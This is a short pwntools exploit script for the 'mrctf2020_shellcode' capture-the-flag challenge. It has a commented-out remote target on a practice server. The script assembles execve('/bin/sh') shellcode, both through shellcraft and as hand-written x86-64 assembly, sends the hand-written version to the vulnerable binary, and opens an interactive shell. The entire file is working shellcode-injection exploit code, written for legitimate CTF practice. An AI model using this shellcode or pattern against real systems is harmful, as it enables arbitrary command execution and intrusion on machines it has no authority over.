from pwn import *
context(os = 'linux',arch = 'amd64',terminal = ['tmux', 'sp', '-h'])
p =  process('./mrctf2020_shellcode')
#p = remote('node3.buuoj.cn',27250)
shellcode1 = shellcraft.sh()
payload1 = asm(shellcode1)

shellcode2 = '''
    mov rbx, 0x68732f6e69622f
    push rbx
    push rsp
    pop rdi
    xor esi, esi
    xor edx, edx
    push 0x3b
    pop rax
    syscall
'''
payload2 =asm(shellcode2)
p.send(payload2)
p.interactive()